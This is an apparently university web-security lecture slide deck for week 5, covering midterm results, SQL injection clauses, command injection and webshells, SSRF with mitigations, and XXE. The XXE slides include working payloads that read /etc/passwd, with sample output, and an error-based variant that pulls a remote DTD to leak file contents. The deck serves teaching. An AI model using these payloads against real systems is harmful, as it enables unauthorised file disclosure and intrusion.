---
title: "Week 5"
layout: "bundle"
outputs: ["Reveal"]
date: 2021-07-01T01:19:37+10:00
---

{{< slide class="center" >}}

## Week 5

---

{{< slide content="secedu.goodfaith" >}}

---

### Midsem Review

How did(nt) the midsem go?


{{% fragment %}}

<div style="font-size: 0.8em">

<ul>
<li>Q1 - HTML - 100%</li>
<li>Q1 - Header - 71%</li>
<li>Q1 - Robots - 51%</li>
<li>Q2 (Parameter Fixing) - 98%</li>
<li>Q3 (Source Auditing) - 48%</li>
<li>Q4 (Information Leak) - 54%</li>
<li>Q5 - IDOR - 43%</li>
<li>Q5 - SQLi / IDOR - 2%</li>
<li>Q5 - SQLi (supersecret) - 0%</li>
<li>Bonus (Instructions) - 93%</li>
<li>Secret Flag (midsem0) - 1%</li>
</ul>

</div>
{{% /fragment %}}

{{% note %}}

https://www.youtube.com/watch?v=sh5O9uYFC9Y

{{% /note %}}

---

{{< slide class="center" >}}

## Bonus Marks
## (redemption)

&nbsp;  

Topic 2 challenge walkthroughs  
Cool things?  

---

{{< slide class="center" >}}

### Recent News

[Atlassian go brrr](https://www.itnews.com.au/news/vulnerability-chain-allowed-atlassian-account-hijacks-566489)

* CSP error in one of the subdomains

---

##### Topic 3 Challenges

<img height="590px" src="../topic3-hint-graphic.png" />

{{% note %}}

https://www.openlearning.com/unswcourses/courses/webapp-security/challenges/topic-3/?cl=1

Also, extended till Monday 11.59pm

{{% /note %}}

---

{{< slide class="center" >}}

## More Injection

---

{{< slide class="center" >}}

### SQLI

* ORDER BY
* GROUP BY
* DISTINCT
* LIMIT
* OFFSET

---

## Command Injection / RCE

> Properly handle user input!

* Remote Shell
* Web Shell
* SSTI

&nbsp;  

_Let's have a look at WebCMS4 again_

{{% note %}}

https://github.com/WhiteWinterWolf/wwwolf-php-webshell

wwwolf-php-webshell

{{% /note %}}

---

## SSRF

{{% section %}}

> Think back to HaaS

* Only access to `kb` from `haas`
* We could send network requests that appeared to originate from the `haas` server
* Corporate / internal network?

---

#### Main Idea

Utilise the outbound connection of a device to access/gain more information

* Information retrieval
* Information disclosure - i.e. cse login servers
* Can lead to RCE
* Server Side Includes

> Make a server do something it's not intended to

---

#### Mitigation

* URL parsing is hard
* Whitelist domains and IPs!
* Lower the access control of services
* Set limits! exec time, file sizes, recursion depth
* Local devices should NOT be assumed to be safe

{{% /section %}}

---

### XXE (XML External Entity)

> [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

{{% section %}}

* DTD - Document Type Definition
* Internal Entity: If an entity is declared within a DTD
  * Kinda like variables
* External Entity: If an entity is declared outside a DTD
  * i.e external resources, used as data feeds

---

##### e.g Internal Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % mystr "wowowo" >
]> 
<data>
  <item>&mystr;</item>
</data>
```

```c
wowowo
```

---

##### e.g. External Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY number SYSTEM "http://randomNumberGenerator.com">
]> 
<data>
  <item>&number;</item>
</data>
```

```c
7
```

---

##### e.g. Parameterised Entities

```xml
<!DOCTYPE foo [
  <!ENTITY % string "woah" >
  <!ENTITY % result "Got me like: %string;" >
]>
```

```c
Got me like: woah
```

---

##### Exploit: LFI / SSI

Exploit the external entity to perform LFI / SSI

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY passwdFile SYSTEM "file:///etc/passwd">
]> 
<data>
  <item>&passwdFile;</item>
</data>
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

---

### Exploit: Error-Based XXE

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://some.server/ext.dtd">
    %ext;
]>
<message></message>
```

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % A "<!ENTITY &#x25; B SYSTEM 'file:///lol/%file;'>">
%A;
%B;
```

---

{{< slide class="center" >}}

#### Many more...

{{% /section %}}

---

# Deliverables

* This topic's challenges due next **Monday** 23:59pm
* Report - Week 7

> Enjoy your Week 6 break ~